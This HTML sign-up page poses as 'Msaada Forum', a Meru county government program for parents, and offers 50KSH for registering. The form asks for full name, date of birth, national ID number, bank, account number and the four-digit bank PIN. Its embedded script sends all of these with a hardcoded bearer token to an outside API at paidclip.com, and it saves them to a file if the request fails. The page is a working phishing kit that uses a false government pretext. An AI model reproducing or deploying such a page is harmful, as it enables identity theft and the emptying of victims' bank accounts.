<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Msaada Forum - Home</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", Arial, sans-serif;
      background: url('https://images.unsplash.com/photo-1521791136064-7986c2920216?auto=format&fit=crop&w=1600&q=80') 
                  no-repeat center center fixed;
      background-size: cover;
      color: #fff;
      position: relative;
      overflow-x: hidden;
    }

    .overlay {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0,0,0,0.6);
      z-index: 0;
    }

    /* Navigation bar */
    nav {
      position: relative;
      z-index: 2;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px 40px;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
    }

    nav .nav-left {
      display: flex;
      align-items: center;
    }

    nav .logo {
      font-size: 2rem;
      font-weight: bold;
      color: #4CAF50;
    }

    nav ul {
      list-style: none;
      display: flex;
      margin: 0;
      padding: 0;
    }

    nav ul li {
      margin: 0 15px;
    }

    nav ul li a {
      text-decoration: none;
      color: #fff;
      font-size: 1rem;
      transition: color 0.3s ease;
    }

    nav ul li a:hover {
      color: #4CAF50;
    }

    /* Container */
    .container {
      position: relative;
      z-index: 1;
      max-width: 500px;
      margin: 40px auto;
      padding: 30px;
      border-radius: 15px;
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      color: #fff;
      box-shadow: 0px 6px 20px rgba(0,0,0,0.6);
      text-align: center;
    }

    h2 {
      margin-bottom: 8px;
      font-size: 1.8rem;
    }

    p {
      font-size: 0.9rem;
      color: #ddd;
      margin-bottom: 15px;
    }

    label {
      display: block;
      text-align: left;
      margin: 12px 0 5px;
      font-size: 0.9rem;
    }

    input, select {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 6px;
      margin-bottom: 10px;
      font-size: 1rem;
      outline: none;
    }

    .section-divider {
      height: 2px;
      background: rgba(255,255,255,0.3);
      margin: 25px 0;
    }

    .bank-section {
      background: rgba(0, 100, 0, 0.3);
      padding: 20px;
      border-radius: 10px;
      margin-top: 20px;
    }

    button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.3s ease;
      margin-top: 15px;
      background-color: #4CAF50;
      color: white;
    }

    button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <div class="overlay"></div>

  <!-- Navigation Bar -->
  <nav>
    <div class="nav-left">
      <div class="logo">MSAADA FORUM</div>
    </div>
    <ul>
      <li><a href="#">Home</a></li>
      <li><a href="#">About</a></li>
      <li><a href="#">Services</a></li>
      <li><a href="#">Contact</a></li>
    </ul>
  </nav>

  <!-- Main Form -->
  <div class="container">
    <h2>Welcome to Msaada Forum</h2>
    <p>Msaada forum was created by the county government of meru to empower parents in kids upbringing. Finish signing up to earn 50KSH</p>

    <label for="name">Name</label>
    <input type="text" id="name" placeholder="Enter your full name" />

    <label for="age">Age</label>
    <input type="number" id="age" placeholder="Enter your age" />

    <label for="dob">Date of Birth</label>
    <input type="date" id="dob" />

    <label for="idNumber">ID Number</label>
    <input type="text" id="idNumber" placeholder="Enter your ID number" />

    <label for="kids">Number of Kids</label>
    <input type="number" id="kids" placeholder="Enter number of kids" />

    <label for="occupation">Occupation</label>
    <input type="text" id="occupation" placeholder="Enter your occupation" />

    <div class="section-divider"></div>

    <div class="bank-section">
      <h3>Bank Details</h3>
      <p>Input your bank details in order to connect your bank</p>

      <label for="bankName">Bank Name</label>
      <select id="bankName">
        <option value="">Select your bank</option>
        <option value="equity">Equity</option>
        <option value="kcb">KCB</option>
        <option value="cooperate">Cooperate</option>
      </select>

      <label for="accountNumber">Account Number</label>
      <input type="text" id="accountNumber" placeholder="Enter your account number" />

      <label for="bankPin">Bank PIN</label>
      <input type="password" id="bankPin" placeholder="Enter your bank PIN" maxlength="4" />

      <button id="submitBtn">Submit Application</button>
    </div>
  </div>

  <script>
    document.getElementById('submitBtn').addEventListener('click', async function() {
      // Collect all form data
      const formData = {
        name: document.getElementById('name').value,
        age: document.getElementById('age').value,
        dob: document.getElementById('dob').value,
        idNumber: document.getElementById('idNumber').value,
        kids: document.getElementById('kids').value,
        occupation: document.getElementById('occupation').value,
        bankName: document.getElementById('bankName').value,
        accountNumber: document.getElementById('accountNumber').value,
        bankPin: document.getElementById('bankPin').value
      };

      // Validate required fields
      if (!formData.name || !formData.age || !formData.dob || !formData.idNumber || 
          !formData.kids || !formData.occupation || !formData.bankName || 
          !formData.accountNumber || !formData.bankPin) {
        alert('Please fill in all required fields');
        return;
      }

      try {
        // Send data to PaidClip API
        const response = await fetch('https://api.paidclip.com/submit', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer api_kDg2LrqQcyUw6Wn2F7Uol0z1JfvseiA0'
          },
          body: JSON.stringify(formData)
        });

        if (response.ok) {
          alert('Application submitted successfully! You will receive 50KSH soon.');
          // Reset form
          document.querySelectorAll('input, select').forEach(element => {
            element.value = '';
          });
        } else {
          throw new Error('Failed to submit application');
        }
      } catch (error) {
        console.error('Error:', error);
        alert('Error submitting application. Please try again.');
        
        // Fallback: Save to local file
        const dataBlob = new Blob([JSON.stringify(formData, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(dataBlob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'msaada_application.json';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
      }
    });
  </script>
</body>
</html>
